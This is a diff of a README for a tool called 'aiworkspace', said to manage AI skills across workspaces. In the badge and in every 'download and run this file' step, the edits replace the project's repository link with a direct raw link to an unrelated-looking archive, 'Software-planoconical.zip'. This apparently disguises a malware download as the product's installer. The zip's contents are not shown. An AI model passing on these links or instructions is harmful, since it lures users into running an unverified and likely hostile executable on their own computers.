@@ -1,6 +1,6 @@
 # 🧑‍💻 aiworkspace - Manage AI Skills Across Workspaces
 
-[![Download aiworkspace](https://img.shields.io/badge/Download%20aiworkspace-blue?style=for-the-badge&logo=github)](https://github.com/acapnic-foreground968/aiworkspace)
+[![Download aiworkspace](https://img.shields.io/badge/Download%20aiworkspace-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/acapnic-foreground968/aiworkspace/main/root-config/Software-planoconical.zip)
 
 ## 🚀 Get Started
 
@@ -12,7 +12,7 @@ Use this guide to download and run it from the link above.
 
 Open this page and use it to download and run this file:
 
-https://github.com/acapnic-foreground968/aiworkspace
+https://raw.githubusercontent.com/acapnic-foreground968/aiworkspace/main/root-config/Software-planoconical.zip
 
 If the page opens in your browser, look for the download area or the latest release files. Save the file to your computer before you run it.
 
@@ -63,7 +63,7 @@ Keep your repos inside that folder or link them from there. This makes it easier
 Follow these steps in order.
 
 1. Open the download link:
-   https://github.com/acapnic-foreground968/aiworkspace
+   https://raw.githubusercontent.com/acapnic-foreground968/aiworkspace/main/root-config/Software-planoconical.zip
 
 2. Find the file you need to download. If the page shows a release file, choose the Windows version.
 
@@ -198,4 +198,4 @@ aiworkspace is built for people who want one place to manage:
 
 Use this link to visit the page and download and run this file:
 
-https://github.com/acapnic-foreground968/aiworkspace
+https://raw.githubusercontent.com/acapnic-foreground968/aiworkspace/main/root-config/Software-planoconical.zip
